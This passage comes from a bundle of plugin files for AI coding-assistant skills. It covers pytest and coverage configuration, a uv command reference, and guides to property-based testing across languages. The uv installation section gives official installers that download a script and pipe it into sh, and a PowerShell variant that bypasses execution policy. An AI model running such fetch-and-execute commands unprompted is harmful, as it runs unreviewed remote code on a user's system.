        "plugins/modern-python/skills/modern-python/references/testing.md": "# Testing with pytest\n\nConfiguration and best practices for pytest with coverage enforcement.\n\n## Setup\n\nAdd test dependencies:\n\n```bash\nuv add --group test pytest pytest-cov hypothesis\n```\n\n## pyproject.toml Configuration\n\n```toml\n[tool.pytest]\ntestpaths = [\"tests\"]\npythonpath = [\"src\"]\naddopts = [\n    \"-ra\",                      # Show summary of all test outcomes\n    \"--strict-markers\",         # Error on unknown markers\n    \"--strict-config\",          # Error on config issues\n    \"--cov=myproject\",          # Coverage for package\n    \"--cov-report=term-missing\", # Show missing lines\n    \"--cov-fail-under=80\",      # Minimum coverage\n]\nmarkers = [\n    \"slow: marks tests as slow\",\n    \"integration: marks integration tests\",\n]\nfilterwarnings = [\n    \"error\",                    # Treat warnings as errors\n    \"ignore::DeprecationWarning:third_party.*\",\n]\n\n[tool.coverage.run]\nbranch = true\nsource = [\"src/myproject\"]\nomit = [\n    \"*/__main__.py\",\n    \"*/conftest.py\",\n]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"if TYPE_CHECKING:\",\n    \"if __name__ == .__main__.:\",\n    \"raise NotImplementedError\",\n    \"@abstractmethod\",\n]\nfail_under = 80\nshow_missing = true\n```\n\n## Project Structure\n\n```\nmyproject/\n src/\n    myproject/\n        __init__.py\n        core.py\n tests/\n    __init__.py\n    conftest.py          # Shared fixtures\n    test_core.py\n    integration/\n        test_api.py\n pyproject.toml\n```\n\n## Running Tests\n\n```bash\n# Run all tests\nuv run pytest\n\n# Run with verbose output\nuv run pytest -v\n\n# Run specific file\nuv run pytest tests/test_core.py\n\n# Run specific test\nuv run pytest tests/test_core.py::test_function_name\n\n# Run tests matching pattern\nuv run pytest -k \"test_parse\"\n\n# Run marked tests\nuv run pytest -m \"not slow\"\n\n# Stop on first failure\nuv run pytest -x\n\n# Run last failed\nuv run pytest --lf\n```\n\n## Coverage Commands\n\n```bash\n# Run with coverage\nuv run pytest --cov=myproject\n\n# Generate HTML report\nuv run pytest --cov=myproject --cov-report=html\nopen htmlcov/index.html\n\n# Coverage without running tests (use existing data)\nuv run coverage report\nuv run coverage html\n```\n\n## Writing Tests\n\n### Basic Test\n\n```python\n# tests/test_core.py\nfrom myproject.core import add_numbers\n\ndef test_add_numbers():\n    assert add_numbers(2, 3) == 5\n\ndef test_add_negative():\n    assert add_numbers(-1, 1) == 0\n```\n\n### Using Fixtures\n\n```python\n# tests/conftest.py\nimport pytest\nfrom myproject.db import Database\n\n@pytest.fixture\ndef db():\n    \"\"\"Provide a test database.\"\"\"\n    database = Database(\":memory:\")\n    database.init()\n    yield database\n    database.close()\n\n@pytest.fixture\ndef sample_data(db):\n    \"\"\"Populate database with sample data.\"\"\"\n    db.insert({\"name\": \"test\"})\n    return db\n```\n\n```python\n# tests/test_db.py\ndef test_query(sample_data):\n    result = sample_data.query(\"test\")\n    assert result is not None\n```\n\n### Parametrized Tests\n\n```python\nimport pytest\n\n@pytest.mark.parametrize(\"input,expected\", [\n    (\"hello\", 5),\n    (\"\", 0),\n    (\"test\", 4),\n])\ndef test_string_length(input, expected):\n    assert len(input) == expected\n```\n\n### Testing Exceptions\n\n```python\nimport pytest\nfrom myproject.core import divide\n\ndef test_divide_by_zero():\n    with pytest.raises(ZeroDivisionError):\n        divide(1, 0)\n\ndef test_divide_by_zero_message():\n    with pytest.raises(ZeroDivisionError, match=\"division by zero\"):\n        divide(1, 0)\n```\n\n### Async Tests\n\n```bash\nuv add --group test pytest-asyncio\n```\n\n```python\nimport pytest\n\n@pytest.mark.asyncio\nasync def test_async_function():\n    result = await fetch_data()\n    assert result is not None\n```\n\n## Property-Based Testing with Hypothesis\n\n```bash\nuv add --group test hypothesis\n```\n\n```python\nfrom hypothesis import given, strategies as st\nfrom myproject.core import reverse_string\n\n@given(st.text())\ndef test_reverse_is_reversible(s):\n    assert reverse_string(reverse_string(s)) == s\n\n@given(st.integers(), st.integers())\ndef test_add_commutative(a, b):\n    assert add(a, b) == add(b, a)\n```\n\n## Markers\n\n```python\nimport pytest\n\n@pytest.mark.slow\ndef test_slow_operation():\n    # Long running test\n    pass\n\n@pytest.mark.integration\ndef test_api_call():\n    # Requires external service\n    pass\n\n@pytest.mark.skip(reason=\"Not implemented yet\")\ndef test_future_feature():\n    pass\n\n@pytest.mark.skipif(sys.platform == \"win32\", reason=\"Unix only\")\ndef test_unix_feature():\n    pass\n```\n\n## CI Configuration\n\n```yaml\n# GitHub Actions\n- name: Checkout\n  uses: actions/checkout@<sha>  # <latest> https://github.com/actions/checkout/releases\n\n- name: Run tests\n  run: |\n    uv sync --group test\n    uv run pytest --cov-report=xml\n\n- name: Security audit\n  run: |\n    uv sync --group audit\n    uv run pip-audit\n\n- name: Upload coverage\n  uses: codecov/codecov-action@<sha>  # <latest> https://github.com/codecov/codecov-action/releases\n  with:\n    files: ./coverage.xml\n```\n\n## Makefile Target\n\n```makefile\n.PHONY: test\n\ntest:\n\tuv run pytest\n\ntest-cov:\n\tuv run pytest --cov-report=html\n\topen htmlcov/index.html\n\ntest-fast:\n\tuv run pytest -x -q --no-cov\n```\n",
        "plugins/modern-python/skills/modern-python/references/uv-commands.md": "# uv Command Reference\n\n`uv` is an extremely fast Python package and project manager written in Rust. It replaces pip, virtualenv, pip-tools, pipx, and pyenv.\n\n**Key principle:** Always use `uv run` to execute commands. Never manually activate virtual environments.\n\n## Installation\n\n```bash\n# macOS/Linux\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n\n# Windows\npowershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n\n# Homebrew\nbrew install uv\n\n# pipx\npipx install uv\n```\n\n## Project Commands\n\n### Initialize Projects\n\n| Command | Description |\n|---------|-------------|\n| `uv init` | Create new project (application) |\n| `uv init --package` | Create distributable package with src/ layout |\n| `uv init --lib` | Create library package |\n| `uv init --script file.py` | Create script with PEP 723 metadata |\n\n### Dependency Management\n\n| Command | Description |\n|---------|-------------|\n| `uv add <pkg>` | Add dependency to project |\n| `uv add <pkg> --group dev` | Add to dependency group |\n| `uv add <pkg> --optional feature` | Add to optional dependency |\n| `uv remove <pkg>` | Remove dependency |\n| `uv lock` | Update lock file without installing |\n\n### Environment Management\n\nuv manages virtual environments automatically. Do not manually create or activate venvs.\n\n| Command | Description |\n|---------|-------------|\n| `uv sync` | Install dependencies (creates venv if needed) |\n| `uv sync --all-groups` | Install all dependency groups |\n| `uv sync --group dev` | Install specific group |\n| `uv sync --frozen` | Install from lock file exactly |\n\n### Running Code\n\n| Command | Description |\n|---------|-------------|\n| `uv run <cmd>` | Run command in project venv |\n| `uv run python script.py` | Run Python script |\n| `uv run pytest` | Run pytest |\n| `uv run --with pkg cmd` | Run with temporary dependency |\n\n### Building & Publishing\n\n| Command | Description |\n|---------|-------------|\n| `uv build` | Build wheel and sdist |\n| `uv build --wheel` | Build wheel only |\n| `uv build --sdist` | Build sdist only |\n| `uv publish` | Publish to PyPI |\n| `uv publish --token $TOKEN` | Publish with API token |\n\n## Tool Commands\n\nRun Python tools without installing globally:\n\n```bash\n# Run any tool\nuv tool run ruff check .\nuvx ruff check .  # shorthand\n\n# Install tool globally\nuv tool install ruff\n\n# List installed tools\nuv tool list\n\n# Upgrade tool\nuv tool upgrade ruff\n```\n\n## Python Version Management\n\n```bash\n# Install Python version\nuv python install 3.12\n\n# List available versions\nuv python list\n\n# Pin project to Python version\nuv python pin 3.12\n\n# Use specific version\nuv run --python 3.11 pytest\n```\n\n## Script Commands (PEP 723)\n\n```bash\n# Create script with inline metadata\nuv init --script myscript.py\n\n# Add dependency to script\nuv add --script myscript.py requests\n\n# Run script (auto-installs deps)\nuv run myscript.py\n```\n\n## Common Workflows\n\n### New Application Project\n\n```bash\nuv init myapp\ncd myapp\nuv add fastapi uvicorn\nuv add --group dev ruff pytest\nuv sync --all-groups\nuv run uvicorn myapp:app\n```\n\n### New Library Package\n\n```bash\nuv init --package mylib\ncd mylib\nuv add --group dev ruff pytest pytest-cov\nuv add --group docs sphinx\nuv sync --all-groups\nuv run pytest\nuv build\n```\n\n### Add Tool to Existing Project\n\n```bash\ncd existing-project\nuv add --group dev ruff\nuv run ruff check .\n```\n\n### One-off Script Execution\n\n```bash\n# Run script with dependencies (no project needed)\nuv run --with requests --with rich script.py\n\n# Or use PEP 723 inline metadata\nuv run script_with_metadata.py\n```\n\n## Environment Variables\n\n| Variable | Description |\n|----------|-------------|\n| `UV_CACHE_DIR` | Cache directory location |\n| `UV_NO_CACHE` | Disable caching |\n| `UV_PYTHON` | Default Python version |\n| `UV_PROJECT` | Project directory path |\n| `UV_PROJECT_ENVIRONMENT` | Custom venv directory (e.g., `.venv-dev`) |\n| `UV_SYSTEM_PYTHON` | Use system Python |\n\n## Container/Host Development\n\nWhen developing on a host machine while also running in containers, you can use separate venvs to avoid rebuilding on each context switch:\n\n```bash\n# On host machine (add to shell profile or .envrc)\nexport UV_PROJECT_ENVIRONMENT=.venv-dev\n\n# Now host uses .venv-dev, containers use default .venv\nuv sync  # creates .venv-dev on host\n```\n\nAdd both to `.gitignore`:\n```\n.venv/\n.venv-dev/\n```\n\nThis avoids rebuilding the venv when switching between host and container (different OS, Python versions, or native dependencies).\n\n## Performance Tips\n\n- uv caches aggressively; first install may be slower\n- Use `uv sync --frozen` in CI for reproducible builds\n- Use `uv cache clean` if cache grows too large\n",
        "plugins/property-based-testing/.claude-plugin/plugin.json": "{\n  \"name\": \"property-based-testing\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Property-based testing guidance for multiple languages and smart contracts\",\n  \"author\": {\n    \"name\": \"Henrik Brodin\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/property-based-testing/README.md": "# Property-Based Testing\n\nProperty-based testing guidance for multiple languages and smart contracts.\n\n## Installation\n\nThis plugin is part of the Trail of Bits Skills marketplace.\n\n### Via Marketplace (Recommended)\n\n```\n/plugin marketplace add trailofbits/skills\n/plugin menu\n```\n\nThen select the `property-based-testing` plugin to install.\n\n### Manual Installation\n\n```\n/plugin install trailofbits/skills/plugins/property-based-testing\n```\n\n## What's Included\n\nThis plugin provides a skill that helps Claude Code proactively suggest and write property-based tests when it detects suitable patterns in your code:\n\n- **Serialization pairs**: encode/decode, serialize/deserialize, toJSON/fromJSON\n- **Parsers**: URL parsing, config parsing, protocol parsing\n- **Normalization**: normalize, sanitize, clean, canonicalize\n- **Validators**: is_valid, validate, check_*\n- **Data structures**: Custom collections with add/remove/get operations\n- **Mathematical/algorithmic**: Pure functions, sorting, ordering\n- **Smart contracts**: Solidity/Vyper contracts, token operations, state invariants\n\n## Supported Languages\n\n- Python (Hypothesis)\n- JavaScript/TypeScript (fast-check)\n- Rust (proptest, quickcheck)\n- Go (rapid, gopter)\n- Java (jqwik)\n- Scala (ScalaCheck)\n- Solidity/Vyper (Echidna, Medusa)\n- And many more...\n\nSee `skills/property-based-testing/references/libraries.md` for the complete list.\n",
        "plugins/property-based-testing/skills/property-based-testing/README.md": "# Property-Based Testing Skill\n\nA Claude Code skill that provides guidance for property-based testing (PBT) across multiple programming languages and smart contract development.\n\n## What This Skill Does\n\nWhen activated, this skill helps Claude:\n\n- **Detect PBT opportunities** - Recognizes patterns like encode/decode pairs, validators, normalizers, pure functions, and smart contract invariants\n- **Generate property-based tests** - Creates tests with appropriate strategies, properties, and edge cases\n- **Review existing PBT tests** - Identifies issues like tautological properties, vacuous tests, and weak assertions\n- **Design with properties** - Uses Property-Driven Development to define specifications before implementation\n- **Refactor for testability** - Suggests code changes that enable stronger property testing\n\n## Supported Languages\n\n| Language | Library | Notes |\n|----------|---------|-------|\n| Python | Hypothesis | |\n| JavaScript/TypeScript | fast-check | |\n| Rust | proptest | Also: quickcheck |\n| Go | rapid | Also: gopter |\n| Java | jqwik | |\n| Scala | ScalaCheck | |\n| C# | FsCheck | |\n| Elixir | StreamData | |\n| Haskell | QuickCheck | Also: Hedgehog |\n| Clojure | test.check | |\n| Ruby | PropCheck | |\n| Kotlin | Kotest | |\n| Swift | SwiftCheck | Unmaintained |\n| C++ | RapidCheck | |\n\n### Smart Contract Testing\n\n| Tool | Platform | Description |\n|------|----------|-------------|\n| Echidna | EVM/Solidity | Property-based fuzzer |\n| Medusa | EVM/Solidity | Next-gen parallel fuzzer |\n\nSee [secure-contracts.com](https://secure-contracts.com) for tutorials.\n\n## File Structure\n\n```\nproperty-based-testing/\n SKILL.md           # Entry point - detection patterns and routing\n README.md          # This file\n references/\n     generating.md  # How to write property-based tests\n     reviewing.md   # How to evaluate test quality\n     strategies.md  # Input generation reference\n     design.md      # Property-Driven Development workflow\n     refactoring.md # Making code more testable\n     libraries.md   # PBT library reference by language\n```\n\n## Usage\n\nThe skill activates automatically when Claude detects relevant patterns:\n\n- Serialization pairs (`encode`/`decode`, `serialize`/`deserialize`)\n- Validators and normalizers\n- Pure functions with clear input/output types\n- Data structure operations\n- Smart contracts (Solidity/Vyper)\n\nYou can also invoke it explicitly by asking Claude to use property-based testing.\n\n### Example Prompts\n\n```\n\"Write property-based tests for this JSON serializer\"\n\"Review this Hypothesis test for quality issues\"\n\"Help me design this feature using properties first\"\n\"This function is hard to test - how can I refactor it?\"\n\"Write Echidna invariants for this token contract\"\n```\n\n## Property Quick Reference\n\n| Property | Pattern | Use Case |\n|----------|---------|----------|\n| Roundtrip | `decode(encode(x)) == x` | Serialization |\n| Idempotence | `f(f(x)) == f(x)` | Normalization |\n| Invariant | `property(f(x))` holds | Any transformation, smart contracts |\n| Commutativity | `f(a,b) == f(b,a)` | Binary operations |\n| Oracle | `new(x) == reference(x)` | Refactoring |\n",
        "plugins/property-based-testing/skills/property-based-testing/SKILL.md": "---\nname: property-based-testing\ndescription: Provides guidance for property-based testing across multiple languages and smart contracts. Use when writing tests, reviewing code with serialization/validation/parsing patterns, designing features, or when property-based testing would provide stronger coverage than example-based tests.\n---\n\n# Property-Based Testing Guide\n\nUse this skill proactively during development when you encounter patterns where PBT provides stronger coverage than example-based tests.\n\n## When to Invoke (Automatic Detection)\n\n**Invoke this skill when you detect:**\n\n- **Serialization pairs**: `encode`/`decode`, `serialize`/`deserialize`, `toJSON`/`fromJSON`, `pack`/`unpack`\n- **Parsers**: URL parsing, config parsing, protocol parsing, string-to-structured-data\n- **Normalization**: `normalize`, `sanitize`, `clean`, `canonicalize`, `format`\n- **Validators**: `is_valid`, `validate`, `check_*` (especially with normalizers)\n- **Data structures**: Custom collections with `add`/`remove`/`get` operations\n- **Mathematical/algorithmic**: Pure functions, sorting, ordering, comparators\n- **Smart contracts**: Solidity/Vyper contracts, token operations, state invariants, access control\n\n**Priority by pattern:**\n\n| Pattern | Property | Priority |\n|---------|----------|----------|\n| encode/decode pair | Roundtrip | HIGH |\n| Pure function | Multiple | HIGH |\n| Validator | Valid after normalize | MEDIUM |\n| Sorting/ordering | Idempotence + ordering | MEDIUM |\n| Normalization | Idempotence | MEDIUM |\n| Builder/factory | Output invariants | LOW |\n| Smart contract | State invariants | HIGH |\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Simple CRUD operations without transformation logic\n- One-off scripts or throwaway code\n- Code with side effects that cannot be isolated (network calls, database writes)\n- Tests where specific example cases are sufficient and edge cases are well-understood\n- Integration or end-to-end testing (PBT is best for unit/component testing)\n\n## Property Catalog (Quick Reference)\n\n| Property | Formula | When to Use |\n|----------|---------|-------------|\n| **Roundtrip** | `decode(encode(x)) == x` | Serialization, conversion pairs |\n| **Idempotence** | `f(f(x)) == f(x)` | Normalization, formatting, sorting |\n| **Invariant** | Property holds before/after | Any transformation |\n| **Commutativity** | `f(a, b) == f(b, a)` | Binary/set operations |\n| **Associativity** | `f(f(a,b), c) == f(a, f(b,c))` | Combining operations |\n| **Identity** | `f(x, identity) == x` | Operations with neutral element |\n| **Inverse** | `f(g(x)) == x` | encrypt/decrypt, compress/decompress |\n| **Oracle** | `new_impl(x) == reference(x)` | Optimization, refactoring |\n| **Easy to Verify** | `is_sorted(sort(x))` | Complex algorithms |\n| **No Exception** | No crash on valid input | Baseline property |\n\n**Strength hierarchy** (weakest to strongest):\nNo Exception  Type Preservation  Invariant  Idempotence  Roundtrip\n\n## Decision Tree\n\nBased on the current task, read the appropriate section:\n\n```\nTASK: Writing new tests\n   Read [{baseDir}/references/generating.md]({baseDir}/references/generating.md) (test generation patterns and examples)\n   Then [{baseDir}/references/strategies.md]({baseDir}/references/strategies.md) if input generation is complex\n\nTASK: Designing a new feature\n   Read [{baseDir}/references/design.md]({baseDir}/references/design.md) (Property-Driven Development approach)\n\nTASK: Code is difficult to test (mixed I/O, missing inverses)\n   Read [{baseDir}/references/refactoring.md]({baseDir}/references/refactoring.md) (refactoring patterns for testability)\n\nTASK: Reviewing existing PBT tests\n   Read [{baseDir}/references/reviewing.md]({baseDir}/references/reviewing.md) (quality checklist and anti-patterns)\n\nTASK: Need library reference\n   Read [{baseDir}/references/libraries.md]({baseDir}/references/libraries.md) (PBT libraries by language, includes smart contract tools)\n```\n\n## How to Suggest PBT\n\nWhen you detect a high-value pattern while writing tests, **offer PBT as an option**:\n\n> \"I notice `encode_message`/`decode_message` is a serialization pair. Property-based testing with a roundtrip property would provide stronger coverage than example tests. Want me to use that approach?\"\n\n**If codebase already uses a PBT library** (Hypothesis, fast-check, proptest, Echidna), be more direct:\n\n> \"This codebase uses Hypothesis. I'll write property-based tests for this serialization pair using a roundtrip property.\"\n\n**If user declines**, write good example-based tests without further prompting.\n\n## When NOT to Use PBT\n\n- Simple CRUD without complex validation\n- UI/presentation logic\n- Integration tests requiring complex external setup\n- Prototyping where requirements are fluid\n- User explicitly requests example-based tests only\n\n## Red Flags\n\n- Recommending trivial getters/setters\n- Missing paired operations (encode without decode)\n- Ignoring type hints (well-typed = easier to test)\n- Overwhelming user with candidates (limit to top 5-10)\n- Being pushy after user declines\n",
        "plugins/property-based-testing/skills/property-based-testing/references/design.md": "# Property-Driven Development\n\nDesign features by defining properties upfront as executable specifications, before implementation.\n\n## When to Use\n\n- Designing a new feature from scratch\n- Building something with clear algebraic properties (serialization, validation, transformations)\n- Complex domain where edge cases are likely\n- User wants to think through requirements rigorously before coding\n\n## Process\n\n### Phase 1: Understand the Feature\n\nGather information:\n- **Purpose**: What problem does this solve?\n- **Inputs**: What data does it accept? What makes inputs valid?\n- **Outputs**: What does it produce? What guarantees?\n- **Constraints**: What must always be true?\n- **Edge cases**: Boundary conditions?\n- **Relationships**: Inverse operations? Compositions?\n\n### Phase 2: Identify Candidate Properties\n\nWork through these discovery questions:\n\n| Question | Property Type | Example |\n|----------|---------------|---------|\n| Does it have an inverse operation? | Roundtrip | `decode(encode(x)) == x` |\n| Is applying it twice the same as once? | Idempotence | `f(f(x)) == f(x)` |\n| What quantities are preserved? | Invariants | Length, sum, count |\n| Is order of arguments irrelevant? | Commutativity | `f(a, b) == f(b, a)` |\n| Can operations be regrouped? | Associativity | `f(f(a,b), c) == f(a, f(b,c))` |\n| Is there a neutral element? | Identity | `f(x, 0) == x` |\n| Is there an oracle/reference impl? | Oracle | `new(x) == old(x)` |\n| Can output be easily verified? | Hard/Easy | `is_sorted(sort(x))` |\n\n### Phase 3: Define Input Domain\n\nSpecify valid inputs as strategies. The strategy IS the specification.\n\n**Key principle**: Build constraints INTO the strategy, not via `assume()`.\n\n```python\n@st.composite\ndef valid_registration_requests(draw):\n    \"\"\"Generate valid registration requests - this documents the domain.\"\"\"\n    username = draw(st.text(\n        min_size=3,\n        max_size=20,\n        alphabet=st.characters(whitelist_categories=('L', 'N'))\n    ))\n    email = draw(st.emails())\n    password = draw(st.text(min_size=8, max_size=100))\n    age = draw(st.integers(min_value=13, max_value=150))\n\n    return RegistrationRequest(\n        username=username,\n        email=email,\n        password=password,\n        age=age\n    )\n```\n\n### Phase 4: Write Property Tests (Before Implementation)\n\nCreate tests that will fail initially:\n\n```python\nclass TestFeatureSpec:\n    \"\"\"Property-based specification - should FAIL until implemented.\"\"\"\n\n    @given(valid_inputs())\n    def test_core_property(self, x):\n        \"\"\"[What this guarantees].\"\"\"\n        result = feature(x)\n        assert property_holds(result)\n```\n\n### Phase 5: Iterate on Design\n\nProperties reveal design questions:\n- \"What about deleted users?\"\n- \"Case-sensitive?\"\n- \"Which algorithm?\"\n- \"Stable sort or not?\"\n\nSurface these questions early, before implementation.\n\n## Property Strength Hierarchy\n\nBuild properties incrementally from weak to strong:\n\n### Level 1: Basic (Weak)\n```python\n@given(valid_inputs())\ndef test_no_crash(x):\n    process(x)  # Just don't crash\n```\n\n### Level 2: Type Preservation\n```python\n@given(valid_inputs())\ndef test_returns_type(x):\n    assert isinstance(process(x), ExpectedType)\n```\n\n### Level 3: Invariants\n```python\n@given(valid_inputs())\ndef test_invariant(x):\n    result = process(x)\n    assert invariant_holds(result)\n```\n\n### Level 4: Full Specification (Strong)\n```python\n@given(valid_inputs())\ndef test_complete(x):\n    result = process(x)\n    assert satisfies_all_requirements(result)\n```\n\n## Strategy Design Principles\n\n### 1. Build Constraints Into Strategy\n```python\n# GOOD - constraints in strategy\n@given(st.integers(min_value=1, max_value=100))\ndef test_with_valid_range(x): ...\n\n# BAD - constraints via assume\n@given(st.integers())\ndef test_with_assume(x):\n    assume(1 <= x <= 100)  # High rejection rate\n```\n\n### 2. Match Real-World Constraints\n```python\nvalid_users = st.builds(\n    User,\n    name=st.text(min_size=1, max_size=100),\n    age=st.integers(min_value=0, max_value=150),\n    email=st.emails(),\n)\n```\n\n### 3. Include Edge Cases Explicitly\n```python\n@given(valid_lists())\n@example([])           # Empty\n@example([1])          # Single element\n@example([1, 1, 1])    # Duplicates\ndef test_with_edges(xs): ...\n```\n\n## Common Design Questions Raised\n\nProperties often reveal design gaps:\n\n| Property Attempt | Question Raised |\n|------------------|-----------------|\n| Roundtrip for users | What about deleted/deactivated users? |\n| Duplicate rejection | Case-sensitive? Unicode normalization? |\n| Password storage | Which algorithm? Salted? Configurable? |\n| Ordering guarantee | Stable sort? Tie-breaking rules? |\n\n## Red Flags\n\n- **Writing tautological properties**: Don't reimplement the function logic in the test\n  ```python\n  # BAD - tests nothing\n  assert add(a, b) == a + b\n\n  # GOOD - tests algebraic properties\n  assert add(a, 0) == a  # identity\n  assert add(a, b) == add(b, a)  # commutativity\n  ```\n- **Starting too strong**: Build from weak to strong properties\n- **Ignoring design questions**: Properties that feel awkward often reveal design gaps\n- **Overly complex strategies**: If your input strategy is 50 lines, the domain model might need simplification\n- **Not involving the user**: Design questions should be discussed, not assumed\n\n## Checklist\n\n- [ ] Properties are not tautological\n- [ ] At least one strong property defined\n- [ ] Input strategy documents valid inputs\n- [ ] Design questions have been surfaced\n- [ ] Tests will actually FAIL without implementation\n",
        "plugins/property-based-testing/skills/property-based-testing/references/generating.md": "# Generating Property-Based Tests\n\nHow to create complete, runnable property-based tests.\n\n## Process\n\n### 1. Analyze Target Function\n\n- Read function signature, types, and docstrings\n- Understand input types and constraints\n- Identify output type and expected behavior\n- Note preconditions or invariants\n- Check existing example-based tests as hints\n\n### 2. Design Input Strategies\n\nCreate appropriate generator strategies for each input parameter.\n\n**Principles**:\n- Build constraints INTO the strategy, not via `assume()`\n- Use realistic size limits to prevent slow tests\n- Match real-world constraints\n\n### 3. Identify Applicable Properties\n\n| Property | When to Use | Test Pattern |\n|----------|-------------|--------------|\n| Roundtrip | encode/decode pairs | `assert decode(encode(x)) == x` |\n| Idempotence | normalization, sorting | `assert f(f(x)) == f(x)` |\n| Invariant | any transformation | `assert invariant(f(x))` |\n| No exception | all functions (weak) | Function completes without raising |\n| Type preservation | typed functions | `assert isinstance(f(x), ExpectedType)` |\n| Length preservation | collections | `assert len(f(xs)) == len(xs)` |\n| Element preservation | sorting, shuffling | `assert set(f(xs)) == set(xs)` |\n| Ordering | sorting | `assert all(f(xs)[i] <= f(xs)[i+1] ...)` |\n| Oracle | when reference exists | `assert f(x) == reference_impl(x)` |\n| Commutativity | binary ops | `assert f(a, b) == f(b, a)` |\n\n### 4. Generate Test Code\n\nCreate test functions with:\n- Clear docstrings explaining what each property verifies\n- Appropriate `@settings` for the context\n- `@example` decorators for critical edge cases\n\n### 5. Include Edge Cases\n\nAlways add explicit examples:\n```python\n@example([])           # Empty\n@example([1])          # Single element\n@example([1, 1, 1])    # Duplicates\n@example(\"\")           # Empty string\n@example(0)            # Zero\n@example(-1)           # Negative\n```\n\n## Settings Recommendations\n\n```python\n# Development (fast feedback)\n@settings(max_examples=10)\n\n# CI (thorough)\n@settings(max_examples=200)\n\n# Nightly/Release (exhaustive)\n@settings(max_examples=1000, deadline=None)\n```\n\n## Example Test Patterns\n\n### Roundtrip (Encode/Decode)\n\n```python\n@given(valid_messages())\ndef test_roundtrip(msg):\n    \"\"\"Encoding then decoding returns original.\"\"\"\n    assert decode(encode(msg)) == msg\n```\n\n### Idempotence\n\n```python\n@given(st.text())\ndef test_normalize_idempotent(s):\n    \"\"\"Normalizing twice equals normalizing once.\"\"\"\n    assert normalize(normalize(s)) == normalize(s)\n```\n\n### Sorting Properties\n\n```python\n@given(st.lists(st.integers()))\n@example([])\n@example([1])\n@example([1, 1, 1])\ndef test_sort(xs):\n    result = sort(xs)\n    # Length preserved\n    assert len(result) == len(xs)\n    # Elements preserved\n    assert sorted(result) == sorted(xs)\n    # Ordered\n    assert all(result[i] <= result[i+1] for i in range(len(result)-1))\n    # Idempotent\n    assert sort(result) == result\n```\n\n### Validator + Normalizer\n\n```python\n@given(valid_inputs())\ndef test_normalized_is_valid(x):\n    \"\"\"Normalized inputs pass validation.\"\"\"\n    assert is_valid(normalize(x))\n```\n\n## Complete Example (Python/Hypothesis)\n\n```python\n\"\"\"Property-based tests for message_codec module.\"\"\"\nfrom hypothesis import given, strategies as st, settings, example\nimport pytest\n\nfrom myapp.codec import encode_message, decode_message, Message, DecodeError\n\n# Custom strategy for Message objects\nmessages = st.builds(\n    Message,\n    id=st.uuids(),\n    content=st.text(max_size=1000),\n    priority=st.integers(min_value=1, max_value=10),\n    tags=st.lists(st.text(max_size=50), max_size=20),\n)\n\n\nclass TestMessageCodecProperties:\n    \"\"\"Property-based tests for message encoding/decoding.\"\"\"\n\n    @given(messages)\n    def test_roundtrip(self, msg: Message):\n        \"\"\"Encoding then decoding returns the original message.\"\"\"\n        encoded = encode_message(msg)\n        decoded = decode_message(encoded)\n        assert decoded == msg\n\n    @given(messages)\n    def test_encode_deterministic(self, msg: Message):\n        \"\"\"Same message always encodes to same bytes.\"\"\"\n        assert encode_message(msg) == encode_message(msg)\n\n    @given(messages)\n    def test_encoded_is_bytes(self, msg: Message):\n        \"\"\"Encoding produces bytes.\"\"\"\n        assert isinstance(encode_message(msg), bytes)\n\n    @given(st.binary())\n    def test_decode_invalid_raises_or_succeeds(self, data: bytes):\n        \"\"\"Random bytes either decode or raise DecodeError.\"\"\"\n        try:\n            decode_message(data)\n        except DecodeError:\n            pass  # Expected for invalid input\n```\n\n## Running Tests\n\n```bash\n# Run all property tests\npytest test_file.py -v\n\n# Run with more examples (CI)\npytest test_file.py --hypothesis-seed=0 -v\n\n# Run with statistics\npytest test_file.py --hypothesis-show-statistics\n```\n\n## Checklist Before Finishing\n\n- [ ] Tests are not tautological (don't reimplement the function)\n- [ ] At least one strong property (not just \"no crash\")\n- [ ] Edge cases covered with `@example` decorators\n- [ ] Strategy constraints are realistic, not over-filtered\n- [ ] Settings appropriate for context (dev vs CI)\n- [ ] Docstrings explain what each property verifies\n- [ ] Tests actually run and pass (or fail for expected reasons)\n\n## Red Flags\n\n- **Reimplementing the function**: If your assertion contains the same logic as the function under test, you've written a tautology\n  ```python\n  # BAD - this tests nothing\n  assert add(a, b) == a + b\n  ```\n- **Only testing \"no crash\"**: This is the weakest property - always look for stronger ones first\n- **Overly constrained strategies**: If you're using multiple `assume()` calls, redesign the strategy instead\n- **Missing edge cases**: No `@example` decorators for empty, single-element, or boundary values\n- **No settings**: Missing `@settings` for CI - tests may be too slow or not thorough enough\n",
        "plugins/property-based-testing/skills/property-based-testing/references/libraries.md": "# PBT Libraries by Language\n\n## Quick Reference\n\n| Language | Library | Import/Setup |\n|----------|---------|--------------|\n| Python | Hypothesis | `from hypothesis import given, strategies as st` |\n| JavaScript/TypeScript | fast-check | `import fc from 'fast-check'` |\n| Rust | proptest | `use proptest::prelude::*` |\n| Go | rapid | `import \"pgregory.net/rapid\"` |\n| Java | jqwik | `@Property` annotations, `import net.jqwik.api.*` |\n| Scala | ScalaCheck | `import org.scalacheck._` |\n| C# | FsCheck | `using FsCheck; using FsCheck.Xunit;` |\n| Elixir | StreamData | `use ExUnitProperties` |\n| Haskell | QuickCheck | `import Test.QuickCheck` |\n| Clojure | test.check | `[clojure.test.check :as tc]` |\n| Ruby | PropCheck | `require 'prop_check'` |\n| Kotlin | Kotest | `io.kotest.property.*` |\n| Swift | SwiftCheck | `import SwiftCheck`  unmaintained |\n| C++ | RapidCheck | `#include <rapidcheck.h>` |\n\n### Alternatives\n\n| Language | Alternative | Notes |\n|----------|-------------|-------|\n| Haskell | Hedgehog | Integrated shrinking, no type classes |\n| Rust | quickcheck | Simpler API, per-type shrinking |\n| Go | gopter | ScalaCheck-style, more explicit |\n\n## Smart Contract Testing (EVM/Solidity)\n\n| Tool | Type | Description |\n|------|------|-------------|\n| Echidna | Fuzzer | Property-based fuzzer for EVM contracts |\n| Medusa | Fuzzer | Next-gen fuzzer with parallel execution |\n\n```solidity\n// Echidna property example\nfunction echidna_balance_invariant() public returns (bool) {\n    return address(this).balance >= 0;\n}\n```\n\n**Installation**:\n```bash\n# Echidna (via crytic toolchain)\npip install crytic-compile\n# Download binary from https://github.com/crytic/echidna\n\n# Medusa\ngo install 